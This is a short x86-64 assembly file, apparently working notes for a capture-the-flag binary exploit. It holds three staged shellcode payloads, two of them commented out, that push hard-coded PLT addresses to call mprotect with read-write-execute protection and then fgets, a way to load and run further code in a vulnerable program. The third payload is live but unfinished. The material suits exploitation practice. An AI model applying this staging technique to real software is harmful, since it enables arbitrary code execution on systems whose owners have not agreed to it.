BITS 64

global _start

section .data

section .text
	
_start:
    ;mov eax, 0x14108e3
    ;xor eax, 0x01010101

    ;add al, 0x40
    ;shl eax, 16
    ;add ax, 0x9e2

    ;mov rax, r12 ; 0x4008a0 r12
    ;sub ax, 0xf6
    ;sub ax, 0x136 ; 0x400860 mprotect@plt

; first payload
    ;; r12 = 0x4008a0 _start
    ;mov rax, r12
    ;push rax
    ;push rax ; jump to _start
    ;sub al, 0x40 ; 0x400860 mprotect@plt
    ;push rax
    ;xor edx, edx
    ;mov dl, 7
; end first

; second payload
    ;; r12 = 0x4008a0 _start
    ;push r12
    ;mov r13, [0x6020b0]
    ;ret

; third payload
    ; r12 = 0x4008a0 _start
    mov rax, r12
    ;sub al, 0xa0 ; 0x400800 libc_start_main@plt
    add di, 0x2000
    push rdi
    push rdi ; mmap
    sub al, 0x90 ; 0x400810 fgets@plt
    push rax
    mov rdx, r13
